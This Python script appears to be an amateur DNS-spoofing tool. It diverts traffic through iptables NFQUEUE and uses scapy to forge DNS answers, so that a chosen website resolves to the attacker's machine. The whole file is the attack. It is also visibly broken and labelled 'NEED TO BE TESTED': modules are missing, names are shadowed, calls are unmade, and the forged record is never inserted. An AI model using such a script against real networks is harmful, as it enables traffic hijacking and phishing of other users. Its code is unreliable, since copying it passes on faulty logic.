import subprocess
import scapy.all as s
import netfilterqueue
import time
print("NEED TO BE TESTED ")
input()
subprocess.call("sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
subprocess.call("sudo iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
def ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    #s.gethostbyname()
    return(str(s.getsockname()[0])) #return ip
#############################################################################

def prints(packet):
    ip=ip()
    print(ip)
    input()
    sp=s.IP(packet.get_payload)
    a=input("Enter the website to be spoofed")
    if sp.haslayer(s.DNSRR):
        if a in sp[DNSQR].qname:
            answer=s.DNSRR(qname=a,rdata=ip)
            sp[s.DNS].ancount=1
            del sp[IP].len
            del sp[IP].chksum
            del sp[UDP].chksum
            del sp[UDP].len
            packet.set_payload(str(sp))
    packet.accept()

try:
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,prints)
    queue.run
except KeyboardInterrupt:
    print("[+] Restoring IpTables................")
    time.sleep(1)
    subprocess.call("sudo iptables --flush",shell=True)
    subprocess.run("clear")
